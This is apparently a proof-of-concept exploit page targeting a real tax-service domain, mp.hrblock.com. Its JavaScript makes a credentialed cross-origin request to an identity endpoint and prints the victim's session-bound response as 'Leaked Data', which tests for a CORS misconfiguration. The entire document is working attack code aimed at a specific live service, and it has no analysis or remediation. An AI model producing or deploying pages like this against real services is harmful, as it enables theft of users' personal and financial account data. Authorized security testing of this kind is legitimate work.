<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC Test</title>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
        #data { background: black; color: #00ff00; padding: 20px; border: 2px solid #333; margin-top: 20px; min-height: 50px; text-align: left; white-space: pre-wrap; word-wrap: break-word; }
        button { background: #00ff00; color: black; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; }
        button:active { background: #008800; }
    </style>
</head>
<body>

    <h1>H&R Block Data Fetcher</h1>
    <p>Target: mp.hrblock.com</p>
    
    <button onclick="startExploit()">FETCH DATA NOW</button>

    <div id="data">Waiting for action... (Click the button above)</div>

    <script>
        function startExploit() {
            var display = document.getElementById("data");
            display.innerHTML = "Fetching... Please wait.";

            var xhr = new XMLHttpRequest();
            var target = "https://mp.hrblock.com/idl/hrb/idl";

            xhr.open("GET", target, true);
            
            // Credentials (cookies) capture enable
            xhr.withCredentials = true; 

            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        // Success: Data screen par dikhao
                        display.innerHTML = "SUCCESS! Leaked Data:\n\n" + xhr.responseText;
                        console.log("Data:", xhr.responseText);
                    } else {
                        // Failure: Error dikhao
                        display.innerHTML = "FAILED! Status: " + xhr.status + "\nCheck browser console for CORS error.";
                    }
                }
            };
            xhr.send();
        }
    </script>
</body>
</html>
